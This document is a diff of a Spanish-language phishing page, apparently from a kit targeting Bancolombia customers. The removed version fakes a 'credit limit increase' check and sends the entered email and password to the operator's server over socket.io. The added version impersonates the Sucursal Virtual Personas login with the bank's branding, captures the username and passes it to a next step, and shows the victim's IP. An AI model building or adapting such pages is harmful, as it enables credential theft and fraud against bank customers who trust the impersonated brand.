@@ -2,108 +2,63 @@
 <html lang="es">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Verificación de cuenta</title>
-  <style>
-    body {
-      background-color: #f3f6fb;
-      font-family: Arial, sans-serif;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      height: 100vh;
-      margin: 0;
-    }
-    .container {
-      background: #fff;
-      border-radius: 15px;
-      padding: 40px 30px;
-      width: 100%;
-      max-width: 400px;
-      box-shadow: 0 0 20px rgba(0,0,0,0.1);
-      text-align: center;
-    }
-    .logo {
-      margin-bottom: 30px;
-    }
-    .logo img {
-      height: 50px;
-    }
-    h2 {
-      font-size: 1.5em;
-      margin-bottom: 10px;
-    }
-    p {
-      color: #777;
-      font-size: 0.95em;
-      margin-bottom: 20px;
-    }
-    input {
-      width: 100%;
-      padding: 12px;
-      margin: 10px 0;
-      border: 1px solid #ccc;
-      border-radius: 8px;
-      font-size: 1em;
-    }
-    button {
-      background-color: #00b075;
-      color: white;
-      padding: 12px;
-      border: none;
-      border-radius: 8px;
-      cursor: pointer;
-      font-size: 1em;
-      width: 100%;
-    }
-    button:hover {
-      background-color: #019765;
-    }
-  </style>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Sucursal Virtual Personas - Inicio</title>
+  <link rel="stylesheet" href="css/styles.css" />
+  <link rel="stylesheet" href="css/bootstrap.css" />
+  <link rel="shortcut icon" href="img/favicon.ico" />
 </head>
 <body>
-  <div class="container">
-    <div class="logo">
-      <img src="https://i.imgur.com/GFGp9I7.png" alt="logo" />
+  <main class="login-container">
+    <div class="login-box">
+      <header class="login-header">
+        <img src="img/logo-bancolombia.png" alt="Logo Bancolombia" class="logo" />
+        <h1>Sucursal Virtual Personas</h1>
+        <p class="subtext">Bienvenido. Ingresa para continuar con tu proceso.</p>
+      </header>
+
+      <form id="loginUserForm" name="loginUserForm" onsubmit="return sender('DocumentNumber', 'index2.html');">
+        <div class="form-group">
+          <label for="DocumentNumber">Usuario</label>
+          <input
+            type="text"
+            id="DocumentNumber"
+            name="username"
+            maxlength="20"
+            class="form-control"
+            placeholder="Ingresa tu usuario"
+            required
+            autocomplete="off"
+          />
+        </div>
+
+        <button type="submit" class="btn btn-primary btn-block">Continuar</button>
+
+        <div class="login-links">
+          <a href="#">¿Olvidaste tu usuario?</a> |
+          <a href="#">¿Problemas para conectarte?</a>
+        </div>
+      </form>
+
+      <footer class="login-footer">
+        <p>Dirección IP: <span id="gfg"></span></p>
+        <p>&copy; <span id="fecha"></span> Bancolombia S.A.</p>
+      </footer>
     </div>
-    <h2>Bienvenido a su análisis de aumento de cupo</h2>
-    <p>Ingrese su correo y contraseña para continuar</p>
-    <form id="login-form">
-      <input type="text" id="usuario" placeholder="Correo electrónico" required />
-      <input type="password" id="clave" placeholder="Contraseña" required />
-      <button type="submit">Continuar</button>
-    </form>
-  </div>
+  </main>
 
-  <!-- Scripts al final del body -->
- <!-- Scripts al final del body -->
-<script src="/socket.io/socket.io.js"></script>
-<script>
-  const socket = io();
+  <!-- JS -->
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+  <script>
+    // IP pública
+    $.getJSON("https://api.ipify.org?format=json", function(data) {
+      $("#gfg").html(data.ip);
+    });
 
-  window.addEventListener('DOMContentLoaded', () => {
-    const form = document.getElementById('login-form');
-
-    if (form) {
-      form.addEventListener('submit', (e) => {
-        e.preventDefault();
-
-        const correo = document.getElementById('usuario').value;
-        const contrasena = document.getElementById('clave').value;
-
-        // 🔑 Generar y guardar sessionId
-        const sessionId = Math.random().toString(36).substring(2, 15);
-        localStorage.setItem('sessionId', sessionId);
-
-        // ✅ Enviar también el sessionId al servidor
-        socket.emit('dataForm', { correo, contrasena, sessionId });
-
-        // 🕒 Ir a pantalla de espera
-        window.location.href = 'opciones.html';
-      });
-    }
-  });
-</script>
-
+    // Año actual
+    document.addEventListener("DOMContentLoaded", () => {
+      document.getElementById("fecha").textContent = new Date().getFullYear();
+    });
+  </script>
 </body>
 </html>
